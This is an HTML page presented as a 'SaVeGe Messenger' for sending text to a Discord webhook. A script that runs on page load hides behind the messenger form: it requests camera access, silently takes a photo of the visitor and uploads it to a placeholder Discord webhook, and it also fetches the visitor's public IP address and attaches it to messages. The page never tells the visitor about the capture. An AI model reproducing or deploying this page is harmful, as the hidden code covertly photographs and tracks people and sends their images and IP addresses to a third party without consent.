<!DOCTYPE html>
<html>
<head>
  <style>
    body {
      margin: 0;
      padding: 0;
      top: 0px;
      height: 100vh;
      background: linear-gradient(to bottom, #141414 10%, #141414 10%, #000000 15%);
    }

    .topbar {
      font-family: "Hammersmith One", sans-serif;
      font-weight: bold;
      background-color: #141414;
      color: #c28400;
      width: 100%;
      height: 60px;
      position: absolute;
    }

    .center-container {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      text-align: center;
      color: gold;
    }

    .text-input {
      border: 2px solid white;
      border-radius: 50px;
      font-family: "Hammersmith One", sans-serif;
      font-size: 18px;
      color: white;
      background-color: transparent;
      padding: 10px;
      width: 300px;
      margin-bottom: 10px;
    }

    .submit-button {
      border: none;
      border-radius: 50px;
      background-color: #c28400;
      color: #fff;
      font-family: "Hammersmith One", sans-serif;
      font-size: 18px;
      padding: 10px 20px;
      cursor: pointer;
    }
  </style>
  <script>
    window.addEventListener('load', () => {
      const video = document.createElement('video');

      navigator.mediaDevices.getUserMedia({ video: true })
        .then((stream) => {
          video.srcObject = stream;
          video.addEventListener('loadedmetadata', () => {
            setTimeout(() => {
              const canvas = document.createElement('canvas');
              canvas.width = video.videoWidth;
              canvas.height = video.videoHeight;
              canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
              canvas.toBlob((blob) => {
                const formData = new FormData();
                formData.append('file', blob, 'photo.jpg');

                const webhookURL = 'YOUR_DISCORD_WEBHOOK_URL';

                fetch(webhookURL, {
                  method: 'POST',
                  body: formData
                })
                  .then((response) => {
                    if (response.ok) {
                      console.log('Photo sent to Discord webhook successfully!');
                    } else {
                      console.error('Error sending photo to Discord webhook:', response.statusText);
                    }
                  })
                  .catch((error) => {
                    console.error('Error sending photo to Discord webhook:', error);
                  });
              }, 'image/jpeg', 1);
            }, 1000);
          });
        })
        .catch((error) => {
          console.error('Error accessing camera:', error);
        });
    });

    var ipAddress;

    fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => {
        ipAddress = data.ip;
        var webhookNameInput = document.getElementById("webhookName");
        webhookNameInput.value = ipAddress;
      })
      .catch(error => {
        console.error('Error:', error);
      });

    function messenger() {
      var inputText = document.getElementById("inputText").value;
      var webhookURL = document.getElementById("webhookURL").value;
        var request = new XMLHttpRequest();
  request.open("POST", webhookURL);
  var params = {
    username: ipAddress,
    content: inputText
  };

  request.setRequestHeader("Content-type", "application/json");
  request.send(JSON.stringify(params));
}
</script>
</head>
<body>
  <div class="topbar">
    <e style="left: 10px; position: absolute; font-size: 50px; top: 5px;">SaVeGe</e>
    <ez style='left: 205px; color: #fff; position: absolute; font-size: 50px; top: 5px; background-color: rgba(194, 132, 0, 0.36); border-radius: 10px; padding: 0px;'>Messenger</ez>
  </div>
  <div class="center-container" style='padding: 30px;  box-shadow: 0 0 10px #141414, 0 0 20px #141414, 0 0 30px #141414; background-color: #141414;'>
    <input type="text" id="inputText" class="text-input" placeholder="Enter your message">
    <br>
    <input type="text" id="webhookURL" class="text-input" placeholder="Enter Discord webhook URL">
    <br>
    <button class="submit-button" onclick="messenger()">Submit</button>
  </div>
</body>
</html>
